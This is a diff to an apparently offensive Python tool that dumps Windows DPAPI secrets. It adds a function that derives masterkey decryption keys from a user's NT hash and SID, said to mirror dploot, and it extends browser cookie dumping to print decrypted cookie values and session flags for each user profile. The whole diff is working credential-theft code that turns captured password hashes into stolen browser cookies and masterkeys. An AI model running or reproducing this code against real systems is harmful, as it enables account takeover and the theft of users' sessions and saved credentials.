@@ -38,6 +38,7 @@ import argparse
 import base64
 import csv
 import hashlib
+import hmac
 import io
 import json
 import os
@@ -390,6 +391,28 @@ def _mk_decrypt_file(data: bytes, key: bytes) -> tuple:
         return guid, result
     except Exception:
         return '', None
+
+
+def _derive_user_keys(sid: str, nt_bytes: bytes) -> list:
+    """Derive DPAPI masterkey decryption keys from NT hash + user SID.
+
+    Windows encrypts user masterkeys with an HMAC-SHA1-derived key, not
+    the raw NT hash.  Protected Users adds a PBKDF2-SHA256 derivation.
+    Mirrors dploot's deriveKeysFromUserkey().
+    """
+    z_sid = (sid + '\0').encode('utf-16-le')
+    sid_bytes = sid.encode('utf-16-le')
+
+    key1 = hmac.new(nt_bytes, z_sid, 'sha1').digest()
+    keys = [key1]
+
+    if len(nt_bytes) != 20:
+        tmp = hashlib.pbkdf2_hmac('sha256', nt_bytes, sid_bytes, 10000)
+        tmp2 = hashlib.pbkdf2_hmac('sha256', tmp, sid_bytes, 1)[:16]
+        key2 = hmac.new(tmp2, z_sid, 'sha1').digest()[:20]
+        keys.insert(0, key2)
+
+    return keys
 
 
 def _blob_parse(data: bytes) -> dict:
@@ -1249,7 +1272,7 @@ def _dump_browser_passwords(browser_files: dict, masterkeys: dict, browser: str,
 def _dump_browser_cookies(browser_files: dict, masterkeys: dict, browser: str, out: list):
     header_printed = False
     for username, info in browser_files.items():
-        aes_key, _key_type = _chrome_aes_key(info.get('local_state'), masterkeys)
+        aes_key, key_type = _chrome_aes_key(info.get('local_state'), masterkeys)
         cookies_db = info.get('cookies')
         if not cookies_db or not os.path.isfile(cookies_db):
             continue
@@ -1271,6 +1294,7 @@ def _dump_browser_cookies(browser_files: dict, masterkeys: dict, browser: str, o
                 pass
 
         creds = []
+        encrypted_count = 0
         for host_key, name, enc_val, expires in rows:
             if not enc_val:
                 continue
@@ -1278,16 +1302,24 @@ def _dump_browser_cookies(browser_files: dict, masterkeys: dict, browser: str, o
             if val:
                 session = expires == 0
                 creds.append((host_key, name, val, session))
+            else:
+                encrypted_count += 1
 
-        if creds:
+        if creds or encrypted_count:
             if not header_printed:
                 out.append(f'\n[*] {browser} Cookies')
                 out.append('-' * 60)
                 header_printed = True
-            out.append(f'\n  User profile: {username} ({len(creds)} cookie(s))')
-            for host_key, name, val, session in creds:
-                sess_tag = '  [session]' if session else ''
-                out.append(f'  {host_key}  {name}={val[:120]}{"…" if len(val) > 120 else ""}{sess_tag}')
+            key_tag = f'  [key: {key_type}]' if key_type else ''
+            out.append(f'\n  User profile: {username}{key_tag}')
+            if creds:
+                out.append(f'  ({len(creds)} cookie(s) decrypted)')
+                for host_key, name, val, session in creds:
+                    sess_tag = '  [session]' if session else ''
+                    out.append(f'  {host_key}  {name}={val[:120]}{"…" if len(val) > 120 else ""}{sess_tag}')
+            if encrypted_count:
+                hint = _KEY_FAIL_HINT.get(key_type, 'masterkey missing')
+                out.append(f'  [{encrypted_count} cookie(s) encrypted — {hint}]')
 
 
 # ── DPAPI: WiFi profiles ──────────────────────────────────────────────────────
@@ -1756,13 +1788,17 @@ def _dump_dpapi(host: str, args, auth: list, dpapi_system_hex: str,
                 if not nt_hex or nt_hex == EMPTY_NT:
                     continue
                 nt_bytes = bytes.fromhex(nt_hex)
+                sid = files['user_sids'].get(username, '')
+                keys = _derive_user_keys(sid, nt_bytes) if sid else [nt_bytes]
                 for mkf_path in mkfs:
                     try:
                         data = open(mkf_path, 'rb').read()
-                        guid, mk = _mk_decrypt_file(data, nt_bytes)
-                        if guid and mk and guid not in masterkeys:
-                            masterkeys[guid] = mk
-                            decrypted += 1
+                        for key in keys:
+                            guid, mk = _mk_decrypt_file(data, key)
+                            if guid and mk and guid not in masterkeys:
+                                masterkeys[guid] = mk
+                                decrypted += 1
+                                break
                     except Exception:
                         pass
             if decrypted:
